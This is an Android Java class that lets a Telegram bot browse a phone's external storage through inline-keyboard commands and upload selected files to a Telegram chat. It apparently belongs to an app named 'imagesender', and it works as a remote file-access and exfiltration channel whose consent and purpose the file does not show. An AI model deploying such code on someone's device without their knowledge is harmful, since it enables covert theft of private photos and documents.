package com.dotbhai.imagesender;

import android.os.Environment;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class FileBrowser {

    private static final int MAX_ROWS = 25;

    public static File root() {
        return Environment.getExternalStorageDirectory();
    }

    private static boolean isInside(File f) {
        try {
            return f.getCanonicalPath().startsWith(root().getCanonicalPath());
        } catch (Exception e) { return false; }
    }

    public static JSONArray listKeyboard(File dir) throws Exception {
        if (dir == null || !dir.exists()) dir = root();
        if (!isInside(dir)) dir = root();

        JSONArray rows = new JSONArray();
        File[] items = dir.listFiles();
        if (items == null) items = new File[0];

        List<File> folders = new ArrayList<>();
        List<File> files   = new ArrayList<>();
        for (File f : items) {
            if (f.isDirectory()) folders.add(f); else files.add(f);
        }
        folders.sort((a, b) -> a.getName().compareToIgnoreCase(b.getName()));
        files.sort((a, b)   -> a.getName().compareToIgnoreCase(b.getName()));

        List<File> ordered = new ArrayList<>();
        ordered.addAll(folders);
        ordered.addAll(files);

        int count = 0;
        for (File f : ordered) {
            if (count++ >= MAX_ROWS) break;

            String label = f.isDirectory()
                    ? "📂 " + truncate(f.getName(), 28)
                    : icon(f) + " " + truncate(f.getName(), 26) + " " + size(f);

            JSONObject btn = new JSONObject();
            btn.put("text", label);
            btn.put("callback_data",
                    f.isDirectory() ? "/cd:" + f.getAbsolutePath()
                                    : "/dl:" + f.getAbsolutePath());
            rows.put(new JSONArray().put(btn));
        }

        JSONArray nav = new JSONArray();

        File parent = dir.getParentFile();
        if (parent != null && isInside(parent)) {
            JSONObject up = new JSONObject();
            up.put("text", "⬆️ أعلى");
            up.put("callback_data", "/cd:" + parent.getAbsolutePath());
            nav.put(up);
        }

        JSONObject home = new JSONObject();
        home.put("text", "🏠 الجذر");
        home.put("callback_data", "/cd:" + root().getAbsolutePath());
        nav.put(home);

        JSONObject menu = new JSONObject();
        menu.put("text", "🏠 القائمة");
        menu.put("callback_data", "/menu");
        nav.put(menu);

        if (nav.length() > 0) rows.put(nav);
        return rows;
    }

    public static String describe(File dir) {
        if (dir == null || !dir.exists()) dir = root();
        File[] items = dir.listFiles();
        int folders = 0, files = 0;
        if (items != null) for (File f : items) {
            if (f.isDirectory()) folders++; else files++;
        }
        return "📁 <b>" + dir.getName() + "</b>\n"
                + "المسار: <code>" + dir.getAbsolutePath() + "</code>\n"
                + "مجلدات: " + folders + " | ملفات: " + files;
    }

    public static boolean sendFile(File f) {
        if (f == null || !f.exists() || !f.isFile()) return false;
        if (!isInside(f)) return false;

        long size = f.length();
        if (size > 45L * 1024 * 1024) {
            TelegramSender.sendMessage("⚠️ كبير جداً: " + f.getName() + " " + size(size));
            return false;
        }
        TelegramSender.sendDocument(f, "📄 " + f.getName() + " — " + size(size));
        return true;
    }

    private static String truncate(String s, int max) {
        if (s == null) return "?";
        return s.length() <= max ? s : s.substring(0, max - 1) + "…";
    }

    private static String size(long bytes) {
        if (bytes < 1024) return bytes + "B";
        if (bytes < 1024 * 1024) return (bytes / 1024) + "KB";
        if (bytes < 1024L * 1024 * 1024) return (bytes / (1024 * 1024)) + "MB";
        return (bytes / (1024L * 1024 * 1024)) + "GB";
    }

    private static String icon(File f) {
        String n = f.getName().toLowerCase();
        if (n.endsWith(".jpg") || n.endsWith(".jpeg") || n.endsWith(".png")
                || n.endsWith(".webp") || n.endsWith(".gif")) return "🖼️";
        if (n.endsWith(".mp4") || n.endsWith(".mkv") || n.endsWith(".avi")) return "🎬";
        if (n.endsWith(".mp3") || n.endsWith(".wav") || n.endsWith(".ogg")) return "🎵";
        if (n.endsWith(".pdf")) return "📕";
        if (n.endsWith(".zip") || n.endsWith(".rar") || n.endsWith(".7z")) return "🗜️";
        if (n.endsWith(".apk")) return "📦";
        if (n.endsWith(".txt") || n.endsWith(".log") || n.endsWith(".json")) return "📝";
        return "📄";
    }
}